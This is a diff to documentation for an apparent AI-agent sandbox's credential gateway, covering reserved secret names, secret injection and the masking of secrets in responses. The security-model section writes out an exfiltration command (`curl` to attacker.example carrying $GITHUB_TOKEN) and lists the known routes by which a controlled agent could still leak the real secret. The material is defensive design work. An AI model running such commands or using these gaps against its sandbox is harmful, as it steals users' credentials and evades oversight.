@@ -112,7 +112,7 @@ id. See [tools](tools.md#mcp) for MCP tools.
 
 | Field | Rules |
 | --- | --- |
-| `auth.secret_name` | The environment variable name in the sandbox. It matches `^[A-Za-z_][A-Za-z0-9_]*$` and is unique in the vault (`400` `secret_name_collision` otherwise). Reserved names are `400`, because ApiPi or guest init sets them: any name that starts with `OPENAI_`, `APIPI_`, `PI_`, or `CODEX_`; `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>`, and `GIT_CONFIG_VALUE_<n>`; and `PATH`, `HOME`, `USER`, `SHELL`, `PWD`, `LD_PRELOAD`, `LD_LIBRARY_PATH`, `NODE_OPTIONS`, `DATABASE_URL`, `SSL_CERT_FILE`, `REQUESTS_CA_BUNDLE`, `GIT_SSL_CAINFO`, `NODE_EXTRA_CA_CERTS`, `CURL_CA_BUNDLE`, `NPM_CONFIG_CACHE`, `npm_config_cache`, `UV_CACHE_DIR`, and the guest init variables `WS`, `CA_BUNDLE`, `CA_DIR`, and `cmd`. |
+| `auth.secret_name` | The environment variable name in the sandbox. It matches `^[A-Za-z_][A-Za-z0-9_]*$` and is unique in the vault (`400` `secret_name_collision` otherwise). Reserved names are `400`, because ApiPi, git, or guest init uses them: any name that starts with `OPENAI_`, `APIPI_`, `PI_`, `CODEX_`, `GIT_`, or `AGENT_BROWSER_`; and `PATH`, `HOME`, `USER`, `SHELL`, `PWD`, `LD_PRELOAD`, `LD_LIBRARY_PATH`, `NODE_OPTIONS`, `DATABASE_URL`, `SSL_CERT_FILE`, `REQUESTS_CA_BUNDLE`, `NODE_EXTRA_CA_CERTS`, `CURL_CA_BUNDLE`, `NPM_CONFIG_CACHE`, `npm_config_cache`, `UV_CACHE_DIR`, and the guest init variables `WS`, `CA_BUNDLE`, `CA_DIR`, and `cmd`. |
 | `auth.secret_value` | The secret: 8 to 16,384 characters of printable ASCII (`!` to `~`), without spaces, line breaks, or other control characters. Otherwise `400`. The value goes into HTTP headers, and the gateway masks it in responses, so a very short value could hide ordinary text. Never returned. |
 | `auth.networking.type` | Must be `limited`. |
 | `auth.networking.allowed_hosts` | 1 to 100 exact hostnames such as `api.github.com`. No scheme, port, path, or wildcard. IP addresses are `400`. Names are stored in lowercase, and duplicates are dropped. |
@@ -250,12 +250,14 @@ credential's `allowed_hosts`, the gateway:
    HTTPS all work,
 2. never changes the request line (path and query string) or the
    request body,
-3. asks the server for an uncompressed response (`Accept-Encoding:
+3. removes `Upgrade` and `Connection`, so the connection is never
+   switched to WebSocket or another protocol that it could not mask,
+4. asks the server for an uncompressed response (`Accept-Encoding:
    identity`),
-4. connects to the real host, checks its real certificate, and sends
+5. connects to the real host, checks its real certificate, and sends
    the request,
-5. replaces the secret with the placeholder again in the response
-   headers and in the response body.
+6. masks the secret in the response headers and the response body, and
+   drops response trailers.
 
 The query string is not substituted on purpose. Many APIs accept form
 fields in the query string and store or show them, for example an
@@ -263,21 +265,50 @@ issue title, a search term, or a repository description. If the
 gateway put the secret there, the agent could make the service write
 the real secret into a page that it or other users can read.
 
-To mask the response body, the gateway streams it and replaces every
-copy of a secret with its placeholder, also when a copy is split
-between two network reads. Because the length changes, it removes
-`Content-Length` and sends the body with chunked transfer encoding. If
-the server still compresses the body with `gzip` or `deflate`, the
-gateway decompresses it first and removes `Content-Encoding`. Any other
-encoding, such as `br`, fails the request with `502` and is logged as
-`event=egress.encoding_rejected`. Responses without a body (`HEAD`,
-`204`, `304`) are passed as they are.
+#### What is masked in responses
+
+In the headers and the body of HTTPS responses from a credential's
+hosts, the gateway replaces these strings with the placeholder:
+
+- the exact `secret_value`,
+- its JSON string form (with `\"` and `\\`, with and without `\/`),
+- its percent-encoded forms (as `encodeURIComponent` writes it, and
+  with `/` left as it is),
+- every `Authorization: Basic` token that the gateway built for this
+  host in the session (base64 of `user:secret_value`); it is replaced
+  with the token the guest sent.
+
+The longest string is replaced first. The gateway does not mask other
+transformations of the secret: a hash, a part of the secret, another
+escaping, or base64 of the bare secret that the agent builds itself.
+The masking is defense in depth for the credential hosts you chose, not
+a filter for everything the agent can do (see
+[security model](#security-model)).
+
+The body is streamed. The gateway holds back only the end of a read
+that could be the start of a masked string, which for a random token is
+almost never more than a few bytes, so streaming APIs (server-sent
+events, NDJSON) keep their timing. Because the length can change, the
+gateway removes `Content-Length` and sends the body with chunked
+transfer encoding. If the server still compresses the body with `gzip`
+(one or more members) or `deflate`, the gateway decompresses it in
+small steps first and removes `Content-Encoding`. A compressed body
+that ends early closes the connection before the end of the body, so
+the client sees an error instead of a cut response. A compressed body
+that expands to more than 10 MiB and more than 100 times its compressed
+size is stopped the same way and logged as `event=egress.decode_limit`.
+Any other encoding, such as `br`, fails the request with `502` and is
+logged as `event=egress.encoding_rejected`. Responses without a body
+(`HEAD`, `204`, `304`) are passed as they are.
 
 A request with the placeholder to any other host goes out unchanged,
-and the placeholder alone is worthless. Plain HTTP on port 80 never
-gets a secret. Connections to hosts that no credential names are not
-decrypted: the gateway passes them through byte for byte, so the guest
-sees the real certificate of those servers.
+and the placeholder alone is worthless. Credential hosts are HTTPS
+only: a plain HTTP connection on port 80 to a credential host is
+rejected with `403` (logged with reason `credential_host_plain_http`),
+so a stored secret cannot be read back unmasked over HTTP. Connections
+to hosts that no credential names are not decrypted: the gateway passes
+them through byte for byte, so the guest sees the real certificate of
+those servers.
 
 The gateway logs each injection as `event=egress.injection` with
 `session_id`, `credential_id`, and `host`, and counts it in
@@ -418,18 +449,33 @@ The guest only has a placeholder. A command such as `env`,
 `cat /proc/self/environ`, or
 `curl https://attacker.example/?k=$GITHUB_TOKEN` shows or sends only
 the placeholder, which is worthless outside this sandbox and changes on
-the next start. The gateway also keeps the secret from coming back
+the next start. The gateway also makes it hard to get the secret back
 through the credential hosts: it never puts the secret into the path,
-the query string, or the body of a request, and it masks the secret in
-the response headers and the response body before the guest sees them.
+the query string, or the body of a request, it allows only HTTPS to
+those hosts, and it masks the secret and its common encoded forms in
+the response headers and the response body before the guest sees them
+(see [what is masked](#what-is-masked-in-responses)).
 
-This does not make a leak impossible. The agent decides which request
-header carries the placeholder, and the gateway replaces it in every
-header value. A credential host that stores an arbitrary request header
-and shows it somewhere other than in the response (for example a request
-log, an audit page, or a webhook delivery view that other users can
-read) could still expose the real secret there. Choose
-`allowed_hosts` that you trust with the token, and keep the list short.
+This does not make a leak impossible:
+
+- The agent decides which request header carries the placeholder, and
+  the gateway replaces it in every header value. A credential host that
+  stores an arbitrary request header and shows it somewhere other than
+  in the response (for example a request log, an audit page, or a
+  webhook delivery view that other users can read) could still expose
+  the real secret there.
+- The gateway masks only the forms listed above. A service that returns
+  the secret in another form (hashed, cut, or encoded differently) is
+  not masked.
+- Masking works only on the connections the gateway terminates, that
+  is, HTTPS to a credential host by its name. With `network.access`
+  `enabled`, the guest can also open a connection to the same server by
+  its IP address or with another server name, and the gateway passes
+  that connection through unchanged. Use `restricted`, which allows only
+  connections by allowed hostnames, when this matters.
+
+Choose `allowed_hosts` that you trust with the token, and keep the list
+short.
 
 The agent can always use the token's rights on the allowed hosts. A
 prompt injection that controls the agent could push to a repository,
